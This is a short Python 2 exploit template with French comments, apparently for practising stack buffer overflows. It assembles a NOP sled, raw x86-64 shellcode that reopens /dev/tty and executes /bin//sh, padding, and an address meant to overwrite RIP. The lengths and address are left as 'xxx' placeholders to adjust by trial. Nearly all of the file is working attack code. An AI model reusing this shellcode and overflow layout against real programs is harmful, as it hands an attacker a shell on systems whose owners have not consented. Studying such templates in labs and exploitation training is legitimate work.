# -*- coding: utf-8 -*-

from struct import pack

payload_len = xxx # Longueur du payload total
nop_before = "\x90"*xxx # Longueur Ã  ajuster... try & retry
# Addresse au milieu des NOPs qui viendra ecraser RIP
rip = xxx

shellcode = '\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05'

padding = "X"*(payload_len-len(nop_before)-len(shellcode))
payload = nop_before + shellcode + padding + pack("<Q", rip)

print payload
